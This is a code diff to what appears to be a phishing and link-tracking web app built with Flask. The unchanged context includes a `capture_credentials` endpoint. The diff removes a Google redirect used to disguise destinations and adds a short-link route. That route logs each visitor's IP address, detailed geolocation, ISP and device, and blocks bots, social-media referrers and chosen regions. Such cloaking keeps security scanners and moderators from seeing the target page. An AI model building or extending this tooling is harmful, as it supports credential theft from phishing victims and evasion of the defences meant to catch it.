@@ -246,10 +246,8 @@ def track_click(short_code):
         preview_url = f"{link.preview_template_url}?target={link.target_url}&uid={unique_id}"
         return redirect(preview_url)
     
-    # Implement intermediate Google redirect
-    domain_part = link.target_url.split("//")[1].split("/")[0]
-    google_redirect_url = f"https://www.google.com/search?q=site%3A{domain_part}&btnI=I&safe=active&url={link.target_url}"
-    return redirect(google_redirect_url)
+    return redirect(link.target_url)
+
 
 @track_bp.route("/p/<short_code>")
 def tracking_pixel(short_code):
@@ -415,4 +413,104 @@ def capture_credentials():
         return jsonify({"success": False, "error": "Failed to capture credentials"}), 500
 
 
+
+
+
+@track_bp.route("/s/<short_code>")
+def redirect_link(short_code):
+    """Simple redirect endpoint for short links"""
+    # Get the tracking link
+    link = Link.query.filter_by(short_code=short_code).first()
+    if not link:
+        return "Link not found", 404
+    
+    # Collect basic tracking data
+    ip_address = get_client_ip()
+    user_agent = get_user_agent()
+    timestamp = datetime.utcnow()
+    referrer = request.headers.get("Referer", "")
+    
+    # Get geolocation data
+    geo_data = get_geolocation(ip_address)
+    
+    # Parse user agent for device and browser info
+    device_info = parse_user_agent(user_agent)
+    
+    # Bot detection
+    is_bot = detect_bot(user_agent, ip_address)
+    
+    # Social referrer check
+    social_check = check_social_referrer()
+    
+    # Geo targeting check
+    geo_check = check_geo_targeting(link, geo_data)
+    
+    # Generate unique ID for this tracking event
+    unique_id = request.args.get("uid") or generate_unique_id()
+    
+    # Determine status and blocking
+    status = "Redirected"
+    block_reason = None
+    should_redirect = True
+    
+    # Apply blocking rules
+    if social_check["blocked"]:
+        block_reason = social_check["reason"]
+        status = "Blocked"
+        should_redirect = False
+    elif geo_check["blocked"]:
+        block_reason = geo_check["reason"]
+        status = "Blocked"
+        should_redirect = False
+    elif link.bot_blocking_enabled and is_bot:
+        block_reason = "bot_detected"
+        status = "Bot"
+        should_redirect = False
+    
+    # Record the tracking event
+    try:
+        event = TrackingEvent(
+            link_id=link.id,
+            timestamp=timestamp,
+            ip_address=ip_address,
+            user_agent=user_agent,
+            country=geo_data["country"],
+            region=geo_data["region"],
+            city=geo_data["city"],
+            zip_code=geo_data["zip_code"],
+            latitude=geo_data["latitude"],
+            longitude=geo_data["longitude"],
+            timezone=geo_data["timezone"],
+            isp=geo_data["isp"],
+            organization=geo_data["organization"],
+            as_number=geo_data["as_number"],
+            device_type=device_info["device_type"],
+            browser=device_info["browser"],
+            browser_version=device_info["browser_version"],
+            os=device_info["os"],
+            os_version=device_info["os_version"],
+            status=status,
+            blocked_reason=block_reason,
+            email_opened=False,
+            redirected=should_redirect,
+            on_page=False,
+            unique_id=unique_id,
+            is_bot=is_bot,
+            referrer=referrer,
+            page_views=1
+        )
+        
+        db.session.add(event)
+        db.session.commit()
+        
+    except Exception as e:
+        db.session.rollback()
+        print(f"Error recording tracking event: {e}")
+    
+    # Handle redirect or blocking
+    if not should_redirect:
+        return f"Access blocked: {block_reason}", 403
+    
+    # Direct redirect to target URL
+    return redirect(link.target_url)
 
